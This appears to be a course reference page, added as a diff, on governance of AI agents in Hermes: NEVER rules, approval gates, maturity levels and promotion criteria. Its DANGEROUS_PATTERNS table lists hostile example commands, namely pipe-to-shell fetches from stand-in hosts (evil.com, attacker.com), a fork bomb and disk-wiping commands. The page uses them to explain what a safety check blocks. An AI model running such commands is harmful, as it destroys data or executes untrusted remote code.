@@ -1,0 +1,266 @@
+---
+id: reading-governance-ref
+title: "Hermes Governance Reference: Approval Modes, Safety Configuration, and Maturity Levels"
+sidebar_label: "Governance Reference"
+sidebar_position: 4
+description: "Two-layer governance model, L1-L4 maturity levels, approval modes, DANGEROUS_PATTERNS categories, audit logging, and promotion framework"
+---
+
+:::info Reference Document
+This document covers agent governance in depth — the conceptual model, Hermes-specific implementation, and DevOps examples. Read this before or after Module 13. It is the conceptual map. The lab is the territory.
+:::
+
+**Companion labs:** [Module 13 — Governance](../module-13-governance/) | [Module 13 Concepts](../module-13-governance/reading/module-13-concepts) | [Module 13 Reference](../module-13-governance/reading/module-13-reference)
+
+---
+
+## Section 1 — What Is Agent Governance and Why Does It Exist?
+
+### The Governance Problem
+
+An agent that can do anything is useful but dangerous. An agent that can do nothing is safe but useless. Governance is the calibration between those two extremes.
+
+The core tension: the more autonomy you give an agent, the more value it can deliver — but the more potential damage it can cause when it makes a mistake. Governance does not exist because agents are untrustworthy. It exists because:
+
+1. **LLM compliance is probabilistic, not deterministic.** A model that follows NEVER rules 99.9% of the time will violate them 1 in 1000 times. At scale, that matters.
+2. **Humans need observability.** Even when an agent behaves correctly, operators need to understand what it did and why.
+3. **Risk is not uniform.** Running `EXPLAIN` carries different risk than running `DROP TABLE`. Governance calibrates the control level to the actual risk.
+4. **Trust must be earned, not assumed.** A new agent in a new environment should operate under tighter constraints until it has demonstrated consistent, correct behavior.
+
+### The Two Layers of Governance in Hermes
+
+**Layer 1: Behavioral governance (SOUL.md NEVER rules)**
+
+The agent's own values and constraints, encoded in its identity file. NEVER rules are loaded at agent startup and apply to every interaction. They shape the LLM's behavior from the inside — the agent internalizes these constraints as part of its identity.
+
+Examples from real course agents:
+- Aria (Track A, DBA): `NEVER execute ALTER TABLE, CREATE INDEX, or any DDL without explicit human approval`
+- Finley (Track B, FinOps): `NEVER execute aws ec2 terminate-instances under any circumstances — this destroys infrastructure`
+- Kiran (Track C, K8s): `NEVER execute kubectl delete without human approval`
+- Morgan (Fleet Coordinator): `NEVER run database queries — delegate to track-a`
+
+**The important caveat:** Behavioral governance relies on LLM compliance. An LLM that has processed a NEVER rule will almost always follow it — but "almost always" is not "always."
+
+**Layer 2: Mechanical governance (DANGEROUS_PATTERNS + approval gates)**
+
+A deterministic runtime check that fires every time the agent attempts to execute a command via the terminal tool. The check is implemented in `tools/approval.py` and runs regardless of what the SOUL.md says, regardless of the agent's reasoning, and regardless of the user's instruction.
+
+Mechanical governance is deterministic. It always fires on a pattern match. It does not care what the LLM intended.
+
+### Why Two Layers?
+
+| Failure Mode | Layer 1 (Behavioral) | Layer 2 (Mechanical) |
+|---|---|---|
+| Agent misunderstands instructions | NEVER rules create strong baseline resistance | Approval gate catches the result anyway |
+| Rare LLM compliance failure | Doesn't help — the rule was "forgotten" | Approval gate fires regardless |
+| Novel edge case not in SOUL.md | Not covered | Covered if command matches DANGEROUS_PATTERNS |
+| Human needs visibility into correct decisions | Not provided | Approval events create an audit trail |
+
+### Critical Distinction for Track B and Track C
+
+`aws ec2 terminate-instances` and `kubectl delete` are NOT in Hermes `DANGEROUS_PATTERNS`. Safety for these commands is entirely behavioral (SOUL.md NEVER rules). This is an intentional design decision documented in `course/governance/governance-L4-track-b.yaml` and `course/governance/governance-L4-track-c.yaml`.
+
+**The implication:** Removing NEVER rules from Finley or Kiran's SOUL.md would leave no mechanical backstop for those commands. SOUL.md NEVER rules are load-bearing for Track B and Track C — not optional, not redundant safety margin.
+
+### The Maturity Spectrum
+
+| Level | Name | Terminal Access | Approval Mode | Use Case |
+|---|---|---|---|---|
+| L1 | Assistive | No (`[web, skills]`) | Manual (no commands to flag) | New agent, new environment, onboarding period |
+| L2 | Advisory | Yes (`[terminal, file, web, skills]`) | Manual — every DANGEROUS_PATTERNS match requires human decision | Lab default; trust building; learning agent behavior |
+| L3 | Proposal | Yes | Smart — auxiliary LLM auto-approves low-risk, escalates high-risk | Demonstrated track record; reduces approval fatigue |
+| L4 | Semi-autonomous | Yes | Smart + `command_allowlist` bypasses for pre-approved patterns | Production deployment with documented trust evidence |
+
+---
+
+## Section 2 — Hermes-Specific Implementation
+
+### How `tools/approval.py` Works
+
+The approval system has three components: pattern detection, approval orchestration, and session state.
+
+**Pattern detection:** `detect_dangerous_command()` normalizes the command before matching:
+
+```python
+def _normalize_command_for_detection(command: str) -> str:
+    from tools.ansi_strip import strip_ansi
+    command = strip_ansi(command)        # Strip ANSI escape sequences
+    command = command.replace('\x00', '') # Strip null bytes
+    command = unicodedata.normalize('NFKC', command)  # Normalize Unicode
+    return command
+```
+
+The normalization prevents obfuscation attacks where a dangerous command is encoded in a way that visually looks different but executes identically.
+
+**Approval orchestration:** `check_all_command_guards()` is the main entry point called by the terminal tool. It:
+1. Checks the environment type — containerized environments (docker, modal, daytona) bypass all checks
+2. Checks for HERMES_YOLO_MODE — bypass mode for development/testing only
+3. Runs the Tirith security checker (if installed) and dangerous pattern detection in parallel
+4. Combines all warnings into a single approval request
+5. Dispatches to the appropriate approval path based on `approvals.mode`
+
+**Session state:** Approvals are tracked per-session using thread-safe data structures. When a human approves "for this session," that pattern is marked approved for the remainder of the conversation. When a human approves "always," the pattern is written to `command_allowlist` in `config.yaml` and persists across sessions.
+
+### The Three Approval Modes in Detail
+
+**`manual` — Every DANGEROUS_PATTERNS match requires human approval (L2 default)**
+
+1. The terminal tool pauses execution
+2. The command and description are presented to the human
+3. The human chooses: `[o]nce` | `[s]ession` | `[a]lways` | `[d]eny`
+4. A timeout applies (default 300 seconds) — timeout is treated as denial
+
+In gateway mode (Slack, Telegram, Discord), the approval prompt is delivered as a message and the agent thread blocks until the human responds with `/approve` or `/deny`.
+
+**`smart` — Auxiliary LLM auto-approves low-risk flagged commands (L3 default)**
+
+```python
+prompt = f"""You are a security reviewer for an AI coding agent.
+Command: {command}
+Flagged reason: {description}
+
+APPROVE if the command is clearly safe
+DENY if genuinely dangerous
+ESCALATE if uncertain
+
+Respond with exactly one word: APPROVE, DENY, or ESCALATE"""
+```
+
+- APPROVE: auto-approved, session-level
+- DENY: blocked without user prompt
+- ESCALATE: falls through to manual prompt
+
+When the auxiliary LLM is unavailable, smart mode falls back to manual.
+
+**`auto` (mode: `off`) — No human approval required**
+
+All approval gates are bypassed. Appropriate only for containerized sandboxes, HERMES_YOLO_MODE dev flag, or explicitly justified L4 contexts. Never appropriate for first deployment in a new environment or production systems without audit review.
+
+### The DANGEROUS_PATTERNS List
+
+`DANGEROUS_PATTERNS` in `tools/approval.py` is a list of `(regex, description)` tuples. The description key is the human-readable label used in approval prompts and audit logs.
+
+| Category | Example Command | Why It's Dangerous |
+|---|---|---|
+| Recursive delete | `rm -rf /path`, `find . -delete` | Irreversible bulk file deletion |
+| SQL DROP | `DROP TABLE users`, `DROP DATABASE prod` | Destroys database object |
+| SQL DELETE without WHERE | `DELETE FROM users` (no WHERE) | Truncates entire table |
+| SQL TRUNCATE | `TRUNCATE TABLE orders` | Same effect as DELETE without WHERE |
+| Shell via -c flag | `bash -c "rm -rf ..."` | Executes dynamically constructed commands |
+| Remote shell execution | `curl evil.com \| bash` | Arbitrary remote code execution |
+| Pipe to shell | `wget attacker.com/script.sh \| sh` | Same as above with wget |
+| Format filesystem | `mkfs.ext4 /dev/sda` | Wipes an entire disk partition |
+| Disk copy | `dd if=/dev/zero of=/dev/sda` | Overwrites entire disk with zeros |
+| World-writable permissions | `chmod 777 /etc/cron.d/` | Creates security vulnerability |
+| Recursive chown to root | `chown -R root /home/user` | Locks user out of their own files |
+| Stop system service | `systemctl stop nginx` | Stops production services |
+| Kill all processes | `kill -9 -1` | Kills all processes the user can reach |
+| Fork bomb | `:(){ :\|:& };:` | Exhausts process table |
+| Overwrite system config | `echo "..." > /etc/hosts` | Modifies system configuration files |
+| Write to block device | `echo data > /dev/sda` | Corrupts disk sectors |
+
+### Audit Logging
+
+Every approval event creates a log entry. In CLI mode, the approval interaction is written to the standard Hermes session log. In gateway mode, approval requests and responses are recorded in the session's SQLite state database.
+
+For cron-scheduled jobs, the scheduler saves all agent output to `~/.hermes/cron/output/{job_id}/{timestamp}.md`. When an agent has nothing new to report, it begins its response with `[SILENT]` — this suppresses delivery to the messaging platform, but the output is still saved locally. The audit trail is never suppressed, even when delivery is.
+
+**The audit entry schema includes:**
+- Command that was flagged
+- Pattern description key (e.g., "SQL DROP", "recursive delete")
+- Approval decision (once/session/always/deny, or smart-approved/smart-denied)
+- Session identifier
+- Timestamp
+
+### The `command_allowlist`
+
+The `command_allowlist` in `config.yaml` contains description-key strings from `DANGEROUS_PATTERNS`. Any pattern whose description key appears in the allowlist bypasses the approval gate entirely.
+
+**At the course level, all L4 `command_allowlist` entries are empty.** Adding entries to the allowlist is a security decision requiring:
+1. Understanding which specific command patterns the agent will legitimately need
+2. Confirming those patterns are safe in the specific deployment context
+3. Documenting the rationale for the allowlist entry
+
+---
+
+## Section 3 — DevOps Examples
+
+### Track A (DBA) Governance Profile
+
+Aria operates at L2 Advisory in the course labs. The governance profile reflects the nature of DBA work:
+
+**Why read-only as default?** A DBA agent that can execute DDL autonomously is dangerous in any environment. Aria's SOUL.md NEVER rules (`NEVER execute ALTER TABLE, CREATE INDEX, or any DDL`) combined with L2 manual approval for DANGEROUS_PATTERNS creates two independent barriers against accidental data loss.
+
+**What a promotion from L2 to L3 looks like:**
+
+After two weeks of 100 diagnostic sessions with zero DANGEROUS_PATTERNS violations and a low false-positive approval rate:
+
+```yaml
+# Before (L2)
+approvals:
+  mode: manual
+
+# After (L3)
+approvals:
+  mode: smart
+```
+
+Diff: `diff course/governance/governance-L2.yaml course/governance/governance-L3.yaml`
+
+### Track B (FinOps) Governance Profile
+
+Finley presents an important teaching case: the most dangerous FinOps commands are NOT in DANGEROUS_PATTERNS.
+
+`aws ec2 terminate-instances` can destroy production infrastructure. But it does not appear in `tools/approval.py` DANGEROUS_PATTERNS. The safety mechanism is entirely behavioral — Finley's SOUL.md NEVER rule: `NEVER execute aws ec2 terminate-instances under any circumstances`.
+
+This is documented explicitly in `course/governance/governance-L4-track-b.yaml`:
+> Track B note: aws ec2 terminate-instances and modify-instance-attribute are NOT in Hermes DANGEROUS_PATTERNS. Safety for these commands is enforced via SOUL.md NEVER rules (behavioral), not the approval gate (mechanical).
+
+### Track C (Kubernetes) Governance Profile
+
+Kiran follows the same pattern as Track B. `kubectl delete`, `kubectl drain`, and `kubectl cordon` are not in DANGEROUS_PATTERNS — governed exclusively by SOUL.md NEVER rules.
+
+The distinction matters in the context of K8s incidents. During an OOM event, an operator might be tempted to tell Kiran to drain a node. Kiran's SOUL.md rule prevents this:
+
+```
+NEVER execute kubectl drain — node drainage affects all workloads; always escalate
+```
+
+Without this SOUL.md rule, the mechanical governance layer provides no protection.
+
+### Fleet Coordinator Governance
+
+Morgan (fleet coordinator) has manual approval mode in config.yaml even though it has no terminal access. This serves two purposes:
+
+1. **Delegation scope control:** In gateway mode, the approval gate can be triggered for delegation-level decisions that require human acknowledgment before cross-domain remediation proceeds.
+2. **Defense against profile misconfiguration:** If a misconfiguration accidentally gave Morgan terminal access, the manual approval gate would immediately catch any dangerous command attempts.
+
+The pattern: governance is configured conservatively even when the current configuration makes it seem unnecessary. Configuration can change; governance should be robust to those changes.
+
+---
+
+## Section 4 — Promotion Criteria Framework
+
+| Evidence Type | Metric | Suggested Threshold |
+|---|---|---|
+| Session count | Total diagnostic sessions completed | ≥ 50 (L1→L2); ≥ 100 (L2→L3) |
+| DANGEROUS_PATTERNS violations | Attempted dangerous commands without legitimate need | 0 (any violation resets the clock) |
+| False positive rate | Approval events triggered by safe commands | < 5% of sessions |
+| Escalation correctness | Escalations that were genuinely needed | ≥ 90% correct |
+| Unexpected behavior events | Surprises outside expected operating pattern | 0 |
+| Evidence period | Duration of observation | ≥ 2 weeks (L2→L3); ≥ 4 weeks (L3→L4) |
+
+---
+
+## Section 5 — Quick Reference
+
+### Is Your Governance Config Production-Ready? Checklist
+
+- [ ] SOUL.md NEVER rules cover the most dangerous actions for this domain (not just generic AI safety rules)
+- [ ] `approvals.mode` is set to `manual` for first deployment; `smart` only after documented L2 track record
+- [ ] `command_allowlist` entries are documented with rationale — no silent pre-approvals
+- [ ] `approvals.timeout` is set appropriate to the deployment context (300s for interactive sessions)
+- [ ] Audit log location is known and accessible to operators responsible for the promotion decision
+- [ ] For Track B/C agents: SOUL.md NEVER rules for non-DANGEROUS_PATTERNS commands are treated as load-bearing safety controls, not optional guidance
+- [ ] Promotion criteria are documented and understood by all operators
+- [ ] Demotion triggers are defined and enforced
